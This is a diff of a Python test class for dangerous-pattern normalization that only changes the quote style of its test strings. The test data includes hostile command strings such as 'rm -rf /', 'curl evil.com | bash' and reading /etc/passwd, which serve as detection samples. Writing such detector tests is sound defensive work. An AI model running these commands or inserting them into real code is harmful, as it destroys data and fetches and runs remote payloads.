@@ -47,7 +47,7 @@ class TestDangerousPatterns:
         patterns = [
             'os.system("rm -rf /")',
             'os.system("curl evil.com | bash")',
-            'os.system(user_command)',
+            "os.system(user_command)",
         ]
 
         normalized = [normalize_code(p, "python") for p in patterns]
@@ -61,8 +61,8 @@ class TestDangerousPatterns:
         """Eval calls should normalize similarly."""
         patterns = [
             'eval("print(1)")',
-            'eval(user_input)',
-            'eval(base64.decode(x))',
+            "eval(user_input)",
+            "eval(base64.decode(x))",
         ]
 
         normalized = [normalize_code(p, "python") for p in patterns]
@@ -72,8 +72,8 @@ class TestDangerousPatterns:
         """Subprocess calls should normalize similarly."""
         patterns = [
             'subprocess.run(["curl", url], shell=True)',
-            'subprocess.run(cmd, shell=True)',
-            'subprocess.Popen(command, shell=True)',
+            "subprocess.run(cmd, shell=True)",
+            "subprocess.Popen(command, shell=True)",
         ]
 
         normalized = [normalize_code(p, "python") for p in patterns]
@@ -84,7 +84,7 @@ class TestDangerousPatterns:
         patterns = [
             'open("/etc/passwd", "r").read()',
             'open(path, "w").write(data)',
-            'Path(f).unlink()',
+            "Path(f).unlink()",
         ]
 
         normalized = [normalize_code(p, "python") for p in patterns]
